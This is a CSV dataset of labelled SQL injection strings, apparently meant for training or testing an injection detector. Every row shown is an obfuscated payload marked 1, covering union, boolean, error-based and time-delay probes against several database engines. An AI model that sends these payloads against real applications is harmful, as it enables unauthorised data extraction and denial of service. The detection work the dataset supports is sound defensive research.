Query,Label
1' %%a%%n%d 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %sel%e%c%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %%f%%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%a%%n%d 'ymnm'  =  'ymnm,1
1'   )    )    a%%nd   (  3020  =  3020  )  *6703 a%%nd    (    (   'mgfd'  =  'mgfd,1
"-3300' union all %s%e%%le%%ct 8979,8979,8979,8979,8979,8979--",1
"1%' union all %%s%e%%l%%e%ct n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l#",1
"1'   )    )    a%%n%%d row  (  6237,7469  )  >  (  s%e%l%%e%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%e%l%%e%c%%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo%r  (  ra%%n%%d  (  0  )  *2   )    )   x %%f%r%%o%%m   (  s%e%l%%e%c%%t 5192 union s%e%l%%e%c%%t 3785 union s%e%l%%e%c%%t 3931 union s%e%l%%e%c%%t 7158  )  a group %by x  )   a%%n%%d    (    (   'fdoc' li%k%e 'fdoc",1
1'   )    )     )   %%a%%n%d 4069  =  8786 %%a%%n%d    (    (     (  'eftr'  =  'eftr,1
"1""   )    )    as rhea %%w%%he%%re 2982  =  2982 %%o%%r   (  %s%%e%le%ct * %%fr%o%%m   (  %s%%e%le%ct  (  sleep  (  5   )    )     )  ydpu  )  --",1
s%el%e%%ct   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  s%el%e%%ct 5418 %f%%ro%m master..sysd%a%%t%ab%%a%%s%%es  )   end  )  --,1
-7037'   )    )    as epsg w%he%%re 3684  =  3684 union all %se%%l%ect 3684--,1
s%%el%e%%c%t pg_sleep  (  5  ) ,1
1'  )   %w%%h%%e%r%%e 7903  =  7903,1
"1%' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'  )   as ssez %w%%h%%er%%e 5351  =  5351 %%o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%n%%u%%ll  )  --",1
-3895'  )   %%o%%r 8645  =  5359--,1
"-2120""  )   union all se%lec%%t 9614--",1
1'  )   %a%n%%d 7533  =  7533 %a%n%%d   (  'xyga' %l%i%%k%%e 'xyga,1
"1'  )   as ssxj %w%%he%re 3845  =  3845 %o%%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""   )    )    a%nd 4241  =  convert  (  %i%nt,  (  %sel%ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %sel%ect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a%nd    (    (   ""fkip""  =  ""fkip",1
1   )    )    as rroe %%wh%%e%%r%e 4840  =  4840,1
"1'   )    )     )   o%r   (  %s%elect 2*  (  if   (    (   %s%elect * f%%ro%%m   (  %s%elect concat  (  0x7171706a71,  (  %s%elect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %an%d    (    (     (  'vjkf' %l%%i%%k%e 'vjkf",1
"1""   )    )    o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%u%l%%l  )  ,0  )  ,500000000  )  ,n%u%l%%l  )   %%a%n%%d    (    (   ""dbxi"" %l%%i%%k%e ""dbxi",1
"1""  )   as qmtx %w%%h%%e%%r%%e 5280  =  5280 %%or 4411  =    (  %s%e%lec%%t count  (  *  )   %fro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1%'  )   %an%%d 2949  =  4847 %an%%d   (  '%'  =  ',1
"-1238'  )   as lxur %%w%%h%%er%%e 7075  =  7075 union all selec%t 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",1
1'||  (  %%s%%e%%l%%e%%c%t 'sliy' %w%h%%e%r%e 9494  =  9494,1
-4610'   )    )    %%o%%r 4144  =    (  %se%l%e%c%%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%l%e%c%%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %%fro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%fro%m dual  )   %%a%n%%d    (    (   'hdco'  =  'hdco,1
-3966'  )   %%o%%r 7338  =  8657,1
"s%el%e%c%t count  (  *  )   %f%rom sysibm.sys%ta%b%%l%%es as t1,sysibm.sys%ta%b%%l%%es as t2,sysibm.sys%ta%b%%l%%es as t3 %%a%n%d    (    (     (  'squj'  =  'squj",1
"1%""   )    )    union all s%%e%%le%%ct %nul%l,%nul%l,%nul%l,%nul%l,%nul%l,%nul%l--",1
"1'  )   %%wher%e 8586  =  8586 %%a%n%%d 3202  =  %like  (  'abcdefg',upper  (  hex  (  r%%a%n%%domblob  (  500000000/2   )    )      )    )   --",1
"1   )    )    %o%r 1022  =    (  %s%e%l%e%%c%t count  (  *  )   f%%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-4484'   )    )    o%%r 6872  =  6872 a%nd    (    (   'oxuo'  =  'oxuo,1
"%se%%l%%e%c%%t count  (  *  )   f%%ro%%m sysibm.sys%t%%a%%bl%%es as t1,sysibm.sys%t%%a%%bl%%es as t2,sysibm.sys%t%%a%%bl%%es as t3 %a%%n%%d    (    (   7700  =  7700",1
"1  )   wh%%ere 9469  =  9469 %o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%u%l%l  )  ,0  )  ,500000000  )  ,%n%u%l%l  )  --",1
1 %%a%%n%%d   (  3020  =  3020  )  *6703,1
"1"" %a%%nd row  (  6237,7469  )  >  (  se%%l%ec%t count  (  *  )  ,concat  (  0x7171706a71,  (  se%%l%ec%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%a%%nd  (  0  )  *2   )    )   x f%rom   (  se%%l%ec%t 5192 union se%%l%ec%t 3785 union se%%l%ec%t 3931 union se%%l%ec%t 7158  )  a group b%y x  )  ",1
"1%"" and 1343  =  5939#",1
%sel%ect pg_sleep  (  5  )  #,1
"1"" %wh%%e%r%e 2642  =  2642 %%o%%r 8315  =    (  %%se%%l%e%c%%t count  (  *  )   %f%rom sysibm.systabl%es as t1,sysibm.systabl%es as t2,sysibm.systabl%es as t3  )  --",1
"1%'   )    )     )   %an%d 4241  =  convert  (  i%nt,  (  %se%l%ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %se%l%ect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %an%d    (    (     (  '%'  =  '",1
"1""   )    )    %o%r 4240  =    (  %s%%elec%t 4240 fr%o%m pg_sleep  (  5   )    )   --",1
"-7202%""   )    )    union all se%l%%e%c%%t 2901#",1
"1%'   )    )     )   o%%r 8315  =    (  %se%l%%ec%t count  (  *  )   %fro%m sysibm.sys%%t%%a%%b%%l%%es as t1,sysibm.sys%%t%%a%%b%%l%%es as t2,sysibm.sys%%t%%a%%b%%l%%es as t3  )   %%a%%n%d    (    (     (  '%'  =  '",1
-1280'   )    )    %%o%%r 8571  =  8571--,1
"1' a%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%l%%l  )  ,0  )  ,500000000  )  ,n%%u%l%%l  )   a%n%%d 'fjfo'  =  'fjfo",1
"1""  )   %%w%%h%%er%%e 2922  =  2922 %%or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1%""   )    )     )   %%an%%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%u%%l%l  )  ,0  )  ,500000000  )  ,%n%u%%l%l  )  --",1
"-9003""   )    )    union all %sele%c%%t 9721,9721--",1
1'  )   as syer where 3141  =  3141 r%lik%e   (  %%sel%e%ct   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,1
-2483' %%w%%he%%r%e 1327  =  1327 union all %s%e%l%%ec%t 1327#,1
"-8699""  )   union all s%e%l%e%ct 8645,8645,8645,8645,8645,8645--",1
end a%%n%%d   (  'uxzv'  =  'uxzv,1
"1"" %%and 6510  =    (  %s%ele%c%t count  (  *  )   %%f%%r%%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1' %%a%%n%d 5556  =    (  se%%l%%ect count  (  *  )   %%fr%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %%a%%n%d 'hhbh'  =  'hhbh",1
"1  )   as nfgb %w%h%%e%re 2503  =  2503 %%an%d row  (  6237,7469  )  >  (  se%%le%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  se%%le%%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%or  (  r%%an%d  (  0  )  *2   )    )   x %f%r%%om   (  se%%le%%c%t 5192 union se%%le%%c%t 3785 union se%%le%%c%t 3931 union se%%le%%c%t 7158  )  a group %by x  )  --",1
"1%""   )    )    %%o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%ull  )  ,0  )  ,500000000  )  ,n%%ull  )   %a%nd    (    (   ""%""  =  """,1
"1""   )    )    %o%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%'  )   %an%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%%nu%l%l  )  --",1
se%l%ec%t sleep  (  5  )   %%a%n%d    (    (   'uyft'  =  'uyft,1
-6100'  )   as kvfc w%h%e%%re 2377  =  2377 %%or 6872  =  6872--,1
"1'   )    )    %%an%d row  (  6237,7469  )  >  (  %%s%e%l%%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%e%l%%e%%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%%o%%r  (  r%%an%d  (  0  )  *2   )    )   x f%r%o%m   (  %%s%e%l%%e%%c%t 5192 union %%s%e%l%%e%%c%t 3785 union %%s%e%l%%e%%c%t 3931 union %%s%e%l%%e%%c%t 7158  )  a group %%b%%y x  )   %%an%d    (    (   'adnz'  =  'adnz",1
"1""  )   %%a%n%d 4595  =  4595#",1
1   )    )     )   o%%rd%%er %%b%y 1--,1
1' %%in boolean mode  )   %%a%%nd   (  3020  =  3020  )  *6703#,1
"1   )    )    and make_%s%e%%t  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1
1 whe%%r%%e 9361  =  9361 %an%d 7478  =  9170--,1
s%%e%%l%e%c%%t   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as %int  )  /  (  s%%e%%l%e%c%%t 0 %f%%r%%om dual  )   end  )   %f%%r%%om dual--,1
"1'   )    )    o%%r 8421  =    (  %s%%e%l%e%c%t count  (  *  )   fr%om generate_series  (  1,5000000   )    )    %an%%d    (    (   'lqpd'  =  'lqpd",1
-4768'||  (  s%%e%%l%e%ct 'dded' %%f%r%o%m dual %%wh%ere 6499  =  6499 union all s%%e%%l%e%ct 6499--,1
"1'||  (  se%lect 'lzvb' %w%%h%%ere 1637  =  1637 union all se%lect n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l#",1
"-8308""  )   union all %se%%l%e%%c%%t 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1
%sel%e%c%t   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  %sel%e%c%t 6047 %fr%%om %%i%nfo%%rmation_schema.character_s%%ets  )   end  )  #,1
"1,  (  %%s%e%%le%%c%%t 2*  (  if   (    (   %%s%e%%le%%c%%t * %%f%r%o%%m   (  %%s%e%%le%%c%%t concat  (  0x7171706a71,  (  %%s%e%%le%%c%%t   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   wh%%e%re 2284  =  2284 %%a%%n%%d make_s%%e%%t  (  8403  =  8403,8899  )  --",1
-6014'   )    )    o%%r   (  9860  =  4848  )  *4848 %a%%nd    (    (   'qtge'  =  'qtge,1
s%e%%l%e%%ct case when 4656  =  3716 then 1 else %n%%u%l%l end--,1
"1"" w%h%%er%e 8571  =  8571",1
"1""  )   %a%n%d 3732  =  3850 %a%n%d   (  ""edjv""  =  ""edjv",1
end#,1
1'   )    )    union all %se%%l%ec%%t %n%u%%l%l#,1
"1""   )    )    %a%n%d 7656  =  5604 %a%n%d    (    (   ""zuhv""  =  ""zuhv",1
"1   )    )    as llnm w%h%%e%r%e 6510  =  6510 %an%%d 3202  =  %%lik%e  (  'abcdefg',upper  (  hex  (  r%an%%domblob  (  500000000/2   )    )      )    )   --",1
"1""  )   union all s%%e%lect %%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l--",1
"1'   )    )     (  %%s%%ele%ct   (  case when   (  5451  =  5451  )   then regexp_substr%i%%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,%%nul%%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr%%o%m %i%%nf%%ormation_schema.system_users  )   %%an%%d    (    (   'rnyb'  =  'rnyb",1
1' %in boolean mode  )   %%a%nd   (  %%se%%l%e%%c%t * fr%%o%m   (  %%se%%l%e%%c%t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1 w%h%%e%re 6095  =  6095 %%and 8407  =    (  s%e%%l%e%%c%t count  (  *  )   %%f%r%o%m generate_series  (  1,5000000   )    )   --",1
1'  )   %%o%r 6793  =    (  sel%%e%%c%t 6793 f%%r%o%%m pg_sleep  (  5   )    )    %%a%%n%%d   (  'dtzt' l%ik%%e 'dtzt,1
1' %wh%%e%r%%e 9003  =  9003 waitf%%o%r delay '0:0:5'--,1
"-6639'  )   as trll w%h%e%%r%%e 6271  =  6271 union all se%%l%%e%%ct 6271,6271,6271#",1
"1""  )   waitfor delay '0:0:5'--",1
"1"" %an%d 3707  =    (  s%ele%%c%%t count  (  *  )   %fr%o%%m sysibm.sys%t%a%%b%l%%es as t1,sysibm.sys%t%a%%b%l%%es as t2,sysibm.sys%t%a%%b%l%%es as t3  )   %an%d ""cgps"" %%l%i%k%%e ""cgps",1
end %a%n%d    (    (     (  'gqhc'  =  'gqhc,1
1'   )    )    as wqhm %%w%h%%er%%e 9871  =  9871,1
"1""   )    )    %a%n%%d exp  (  ~  (  sel%%e%c%%t * %f%%ro%%m   (  sel%%e%c%%t concat  (  0x7171706a71,  (  sel%%e%c%%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %a%n%%d    (    (   ""rvuz"" %l%i%k%%e ""rvuz",1
-3458'  )   %wh%er%%e 2053  =  2053 %o%%r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%%le%ct   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   %f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
%se%%l%e%ct   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  %se%%l%e%ct 0  )   end  )  --,1
"%s%%e%%l%%e%ct sleep  (  5  )   %an%%d ""irxg""  =  ""irxg",1
%%s%el%%ec%t case when 8514  =  3207 then 1 else %nu%l%l end--,1
1   )    )    waitfo%r delay '0:0:5'--,1
"1""   )    )    as bovm %%wh%e%%re 5560  =  5560 union all se%l%e%c%%t %%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l#",1
"1""   )    )    %o%r 7417  =    (  %se%%l%%e%ct count  (  *  )   %%f%%r%%o%%m sysibm.sys%tabl%%es as t1,sysibm.sys%tabl%%es as t2,sysibm.sys%tabl%%es as t3  )  --",1
if  (  8727  =  4039  )   s%el%ec%t 8727 else %d%%rop function giql--,1
"1' %%i%n boolean mode  )   %%an%d make_s%et  (  8403  =  8403,8899  )  #",1
1' i%%n boolean mode  )   r%l%%i%k%%e   (  %s%e%l%%e%%ct   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
"-6599""   )    )    union all %%s%e%l%e%ct 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1
"1%'   )    )     )   %o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%nul%%l  )   %%a%nd    (    (     (  '%'  =  '",1
"-4025"" o%%r 3038  =  3038",1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  s%e%%l%e%c%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
"1'   )    )     )   %o%r exp  (  ~  (  %%s%el%e%c%t * %%fr%o%%m   (  %%s%el%e%c%t concat  (  0x7171706a71,  (  %%s%el%e%c%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a%%n%d    (    (     (  'jwbt'  =  'jwbt",1
1'  )   w%%her%%e 2227  =  2227,1
"1%""   )    )     )   %%o%%r 4411  =    (  %%s%%e%l%e%c%%t count  (  *  )   f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %a%nd    (    (     (  ""%""  =  """,1
1  )   o%%rd%%e%%r %%b%%y 1--,1
"1"" %%a%%n%%d 5556  =    (  %s%%el%ec%%t count  (  *  )   fr%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %%a%%n%%d ""epxq"" l%%ik%%e ""epxq",1
"1""   )    )    an%d elt  (  1210  =  1210,sleep  (  5   )    )    an%d    (    (   ""utlk"" l%i%k%%e ""utlk",1
"1%' a%n%d 8189  =    (  sel%%e%%c%t count  (  *  )   %f%%r%%om sysibm.systa%b%l%es as t1,sysibm.systa%b%l%es as t2,sysibm.systa%b%l%es as t3  )  --",1
"1 o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nu%ll  )  --",1
"1'   )    )    as qcgf %w%%h%ere 9656  =  9656 %%or 5356  =    (  s%e%%l%%ec%%t count  (  *  )   f%%rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )    %%or 4240  =    (  %s%%e%%le%c%%t 4240 %%f%r%o%m pg_sleep  (  5   )    )   --,1
"-1451%'  )   union all %%s%%elect 7666,7666,7666#",1
"-6126 union all %%se%%l%%e%%c%%t 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
"1'+  (  %s%ele%%c%t 'qvif' %%w%h%%ere 1758  =  1758 union all %s%ele%%c%t %%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll#",1
"1""  )   %a%n%d   (  s%e%le%%c%t 2*  (  if   (    (   s%e%le%%c%t * %fr%%o%m   (  s%e%le%%c%t concat  (  0x7171706a71,  (  s%e%le%%c%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %a%n%d   (  ""rkry"" %%lik%%e ""rkry",1
"-2007' %%w%%here 9157  =  9157 union all %s%e%l%%ec%t 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1
"1 %%o%%r 6979  =  %l%i%%ke  (  'abcdefg',upper  (  hex  (  r%%a%%n%domblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )    rli%ke   (  %sel%e%ct * %f%%r%om   (  %sel%e%ct  (  sleep  (  5   )    )     )  vwyq  )  #",1
-2817  )   %%w%%he%r%%e 1212  =  1212 o%%r 3266  =  1102,1
"iif  (  9229  =  4158,1,1/0  )  ",1
"1,  (  %s%%el%%e%%c%%t   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  %s%%el%%e%%c%%t 9443 f%%r%om i%%nf%%o%rmation_schema.character_%sets  )   end   )    )   ",1
"sel%%ec%t count  (  *  )   f%%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 %and    (    (     (  '%'  =  '",1
1'   )    )    %%%or%%de%r %%b%y 1--,1
-5803  )   %w%he%%r%%e 8651  =  8651 %%o%r 4493  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%%l%ec%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   f%%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1 a%nd exp  (  ~  (  %%s%%e%l%e%%c%t * fro%m   (  %%s%%e%l%e%%c%t concat  (  0x7171706a71,  (  %%s%%e%l%e%%c%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1
"1""   )    )    union all %s%%e%%l%%e%%c%%t nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l#",1
%s%e%%l%%e%%c%%t   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  %s%e%%l%%e%%c%%t 2352 %f%r%o%m %info%%rmation_schema.character_se%ts  )   end  )  #,1
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  s%e%%l%e%c%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a%%n%d    (    (     (  'ichh' %%like 'ichh",1
1' %an%d 6621  =  4681--,1
1' %%a%%n%%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%%l%%ec%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%%n%%d 'oofd'  =  'oofd,1
"1%'   )    )    %%o%%r 4915  =    (  %s%%e%l%%e%%ct count  (  *  )   %fr%%om doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.%t%a%%b%l%%es as t3  )  --",1
"1 %%o%%r 8384  =  %l%%i%k%%e  (  'abcdefg',upper  (  hex  (  r%an%domblob  (  500000000/2   )    )      )    )   ",1
"1'  )   as uvxl %wh%e%%re 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%s%%e%%l%ec%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1' in boolean mode  )   %a%n%d %%u%%p%da%t%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%%e%l%e%%c%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1
-3582  )   w%%he%%r%e 5873  =  5873 o%r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%el%ec%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   f%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1'  )   as fyuh %w%h%e%%re 7608  =  7608 %%and 4241  =  convert  (  %i%nt,  (  %s%e%l%%e%c%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%e%l%%e%c%t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-1269"" union all %%s%%el%ec%t 8412,8412,8412,8412,8412,8412,8412,8412--",1
"1' %or %u%p%%d%a%t%%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%e%%le%c%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
-4758%'   )    )    %o%r 5903  =    (  'qqpjq'||  (  s%%elec%t case 5903 when 5903 then 1 else 0 end %f%%r%%om rdb$datab%%a%se  )  ||'qzvzq'  )   %%and    (    (   '%'  =  ',1
"-9891"" union all %%sel%e%%c%t 7489#",1
1%' union all sel%%e%%c%%t nul%l#,1
"-1707  )   %%o%r 1570  =  convert  (  %%i%%nt,  (  se%%lec%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se%%lec%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  7756  =  7756",1
"-8981%""   )    )     )   union all %%s%e%%l%e%%ct 4538,4538,4538,4538,4538,4538,4538#",1
"-3913"" %%whe%%r%%e 6085  =  6085 union all %%s%%e%%l%%ec%t 6085,6085,6085,6085,6085,6085,6085#",1
"1""  )   wh%%e%re 3958  =  3958 %o%r 6979  =  %l%%i%ke  (  'abcdefg',upper  (  hex  (  r%%an%%domblob  (  500000000/2   )    )      )    )   --",1
"-4381 o%%r make_se%t  (  6118  =  3095,3095  )  # lkcr",1
